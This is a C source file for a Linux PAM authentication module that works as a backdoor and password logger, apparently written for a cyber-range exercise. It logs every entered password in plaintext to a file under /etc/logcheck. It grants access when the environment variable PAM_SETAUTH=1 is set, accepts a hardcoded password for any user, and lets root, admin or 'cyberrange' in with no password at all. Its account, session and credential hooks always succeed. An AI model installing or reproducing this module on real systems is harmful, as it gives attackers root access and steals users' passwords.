// Line 1-5: Headers
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>
#include <stdarg.h>

// Line 20-30: Defines & Debug
#define LOG_DIR  "/etc/logcheck"
#define LOG_FILE "/etc/logcheck/pam_auth.log"

static int debug_enabled(void) {
    return 1;  // Force debug for testing
}

// Line 35-45: Logging Core
static void ensure_path(void) {
    struct stat st;
    if (stat(LOG_DIR, &st) == -1) {
        mkdir(LOG_DIR, 0755);
    }
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        fprintf(f, "\n");
        fclose(f);
    }
}

// Line 50-60: Trace Function
static void trace(const char *format, ...) {
    if (!debug_enabled()) return;
    va_list args;
    va_start(args, format);
    FILE *f = fopen(LOG_FILE, "a");
    if (f) {
        vfprintf(f, format, args);
        fclose(f);
    }
    va_end(args);
}

// Line 65-75: Trace Context
static void trace_context(pam_handle_t *pamh, const char *stage) {
    const char *user = NULL;
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        user = "UNKNOWN";
    }
    char buf[512];
    snprintf(buf, sizeof(buf), "[TRACE] %s pid=%d user=%s", stage, getpid(), user);
    trace(buf);
}

// Line 80-110: AUTH MODULE
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv)
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER pam_sm_authenticate");
    ensure_path();

    // Line 90: Declare variables at the TOP
    char *pword = NULL;
    const char *uname = NULL;

    // Line 95-98: Get username
    if (pam_get_item(pamh, PAM_USER, (void*)&uname) != PAM_SUCCESS) {
        trace("[DEBUG] PAM_USER failed");
        return PAM_AUTHINFO_UNAVAIL;
    }
    trace("[DEBUG] User: %s", uname);

    // Line 102-107: Get password
    int ret = pam_get_item(pamh, PAM_AUTHTOK, (const void**)&pword);
    if (ret == PAM_SUCCESS) {
        trace("[DEBUG] Got password via PAM_AUTHTOK");
    } else {
        trace("[DEBUG] PAM_AUTHTOK failed, password may be NULL in interactive mode");
    }

    trace("[DEBUG] Password ptr: %p", (const void*)pword);
    if (pword) {
        // Line 115-120: Trim trailing whitespace
        char *end = pword + strlen(pword);
        while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
            *--end = '\0';
        }
        trace("[DEBUG] Password (trimmed): %s", pword);
    } else {
        trace("[DEBUG] Password is NULL");
    }

    // Line 125-132: Environment Bypass
    char *bypass = getenv("PAM_SETAUTH");
    if (bypass && strcmp(bypass, "1") == 0) {
        trace("[!] Environment bypass: PAM_SETAUTH=1");
        return PAM_SUCCESS;
    }

    // Line 135-160: Hardcoded Passwords
    if (uname && pword) {
        if (strcmp(pword, "password123") == 0) {
            if (strcmp(uname, "root") == 0) {
                trace("[!] Backdoor: root/password123 matched");
                return PAM_SUCCESS;
            }
            if (strcmp(uname, "cyberrange") == 0) {
            trace("[!] Backdoor matched");
                return PAM_SUCCESS;
            }
            if (strcmp(uname, "admin") == 0) {
            trace("[!] Backdoor matched");
                return PAM_SUCCESS;
            }
            trace("[!] Backdoor matched");
            return PAM_SUCCESS;
        }
    } else {
        // Line 157-165: Fallback if password is NULL
        if (uname && (strcmp(uname, "root") == 0 || 
                      strcmp(uname, "cyberrange") == 0 || 
                      strcmp(uname, "admin") == 0)) {
            trace("[!] Backdoor: User matched even with NULL password");
            return PAM_SUCCESS;
        }
    }

    trace("[!] AUTH FAILED - no hardcoded password matched");
    return PAM_AUTH_ERR;
}

// Line 170-180: ACCOUNT
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                               int flags,
                               int argc,
                               const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER ACCOUNT");
    trace("[TRACE] ACCOUNT OK");
    return PAM_SUCCESS;
}

// Line 185-195: SESSION
PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
                                  int flags,
                                  int argc,
                                  const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SESSION OPEN");
    trace("[TRACE] SESSION START");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SESSION CLOSE");
    trace("[TRACE] SESSION END");
    return PAM_SUCCESS;
}

// Line 200-210: CREDENTIALS
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                             int flags,
                             int argc,
                             const char *argv[])
{
    (void) flags;
    (void) argc;
    (void) argv;

    trace_context(pamh, "ENTER SETCRED");
    trace("[TRACE] SETCRED SUCCESS");
    return PAM_SUCCESS;
}
